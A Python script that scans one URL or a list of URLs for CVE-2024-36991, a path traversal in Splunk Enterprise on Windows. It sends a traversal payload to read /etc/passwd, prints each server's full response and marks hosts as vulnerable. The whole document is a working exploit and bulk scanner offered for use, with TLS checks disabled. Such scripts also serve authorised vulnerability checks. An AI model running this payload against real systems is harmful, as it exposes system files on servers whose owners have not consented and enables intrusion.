#!/usr/bin/python3
import requests
import argparse
import os
from requests.exceptions import RequestException
from datetime import datetime
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

the_version = "1.0.1"

LOG_DIR = 'logs'
LOG_FILE = os.path.join(LOG_DIR, 'scan.log')


def log_message(message):
    with open(LOG_FILE, 'a') as log_file:
        log_file.write(f"{datetime.now().strftime('%Y-%m-%d %H:%M:%S')} - {message}\n")

def print_message(level, message):
    if level == 'vulnerable':
        print(f"[VLUN] {message}")
    if level == 'info':
        print(f"[INFO] {message}")
    elif level == 'success':
        print(f"[VLUN] {message}")
    elif level == 'warning':
        print(f"[WARNING] {message}")
    elif level == 'error':
        print(f"[ERROR] {message}")

paths_to_check = payload = "en-US/modules/messaging/C:../C:../C:../C:../C:../etc/passwd"

def make_request(url):
    try:
        response = requests.get(url, verify=False)
        print_message('info', f"Testing single target: {url}")
        print(response.text)
        if response.status_code == 200:
            return response.text
        else:
            return None
    except RequestException as e:
        return None

def test_host(url):
    try:
        fullurl = f"{url}{paths_to_check}"
        body = make_request(fullurl)
        if body is not None and 'admin:' in body:
            print_message('vulnerable', f"Vulnerable: {url}")  
        else:
            print_message('warning', f"Host OK: {url}")
    except RequestException as e:
        print_message('error', f"Timeout: {url}")

def main():
    parser = argparse.ArgumentParser(description='Check for CVE-2024-36991 Splunk Enterprise on Windows.')
    group = parser.add_mutually_exclusive_group(required=True)
    group.add_argument('-u', '--url', help='Target URL (e.g., http://example.com)')
    group.add_argument('-f', '--file', help='File containing list of URLs (one per line)')

    args = parser.parse_args()

    if args.url:        
        test_host(args.url)
    elif args.file:
        with open(args.file, 'r') as f:
            urls = [line.strip() for line in f if line.strip()]
        
        print_message('info', f"Testing multiple targets from file: {args.file}")

        for url in urls:
            print_message('info', f"Testing {url}")
            test_host(url)

        print_message('info', "Scanning complete.")

if __name__ == '__main__':
    main()